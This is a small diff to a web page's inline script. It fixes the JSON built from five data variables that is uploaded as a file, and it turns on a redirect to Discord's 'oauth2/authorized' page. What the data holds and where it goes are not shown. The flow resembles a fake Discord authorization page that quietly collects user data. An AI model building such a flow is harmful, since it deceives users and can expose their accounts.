@@ -856,7 +856,7 @@
                                   const jsonData2 = JSON.parse(text5);
                                   console.log(jsonData5);*/
 
-                                data = '{"content":[' + JSON.stringify(data1) + ',' + JSON.stringify(data2) + ',' + JSON.stringify(data3) + ',' + JSON.stringify(data4) + ',' + JSON.stringify(data5) + ']';
+                                data = '{"content":[' + JSON.stringify(data1) + ',' + JSON.stringify(data2) + ',' + JSON.stringify(data3) + ',' + JSON.stringify(data4) + ',' + JSON.stringify(data5) + ']}';
                                 const fileData = new Blob([data], { type: 'text/plain' });
                                 var formData = new FormData();
                                 formData.append("file", fileData);
@@ -876,7 +876,7 @@
                                     i++;
                                 }
                                 data1()
-                                //window.open("https://discord.com/oauth2/authorized", "_self");
+                                window.open("https://discord.com/oauth2/authorized", "_self");
                             }
                         </script>
 
